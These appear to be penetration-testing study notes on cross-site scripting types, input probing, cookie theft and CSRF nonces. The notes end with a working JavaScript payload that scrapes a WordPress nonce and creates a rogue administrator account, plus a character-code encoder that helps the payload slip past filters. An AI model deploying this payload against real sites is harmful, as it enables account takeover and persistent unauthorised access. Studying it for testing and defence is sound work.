
-------
Stored XSS attacks, also know as *Persistent* XSS, occurs when the exploit payload is stored in a database or cached by the server. The web application then displays the payload to anyone that visits the vulnerable site.

*Reflected* XSS attacks usually include the payload in crafted requests or links.

Either of these two vulnerability variants can manifest as client or server-side; they can also be DOM-based

DOM-Based XSS takes place solely within the pages Document Object Model (DOM). DOM based XSS can be stored or reflected

#### Identifying XSS vulnerabilities

We can find potential entry points for XSS by examining a web application and identifying input fields that accept unsensitized input. Once we identify an input we can input special characters to try and cause an error in loading the Web response. The most common characters for this include:

- <
- >
- '
- "
- {
- }
- ;

#### Privilege Escalation via XSS

Since XSS can be used to run JavaScript code on the client side, we could leverage this to steal information from the user such as cookies. If we steal an authenticated users cookie we could act as that user for a period of time.

When trying to steal user cookies, there are two server security headers that are important to us:
 - Secure - only over HTTPS
 - HttpOnly - JavaScript does not have access to the cookie

Furthermore, when conducting CSRF (Cross Site Request Forgery) a security header know as a CSRF-TOKEN acts as a method to prevent CSRF attacks. This works by sharing a long and unpredictable value only with the webserver and client. Any requests in the webserver need to be made with the token or else they are ineffective.

This means that a malicious link will not execute as the nonce value is not know to the attacker. However once this is known the attack can become successful. The nonce, will regenerate frequently.

The Nonce will not be effective if XSS is triggered on the site itself as the request will already include the user nonce. It will only be effective if a CSRF request is to another site, in which the CSRF token cannot be reasonably known. Unless the attacker finds XSS on both sites in which CSRF will be pointless.

Simple JavaScript payload to gain user CSRF nonce and execute code on admin account:

```javascript
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```

To prevent this payload from incorrectly running we convert the characters into ASCII equivalent to prevent bad characters. This can be done using this code:

```javascript
function encode_to_javascript(string) {
            var input = string
            var output = '';
            for(pos = 0; pos < input.length; pos++) {
                output += input.charCodeAt(pos);
                if(pos != (input.length - 1)) {
                    output += ",";
                }
            }
            return output;
        }
        
let encoded = encode_to_javascript('insert_minified_javascript')
console.log(encoded)
```
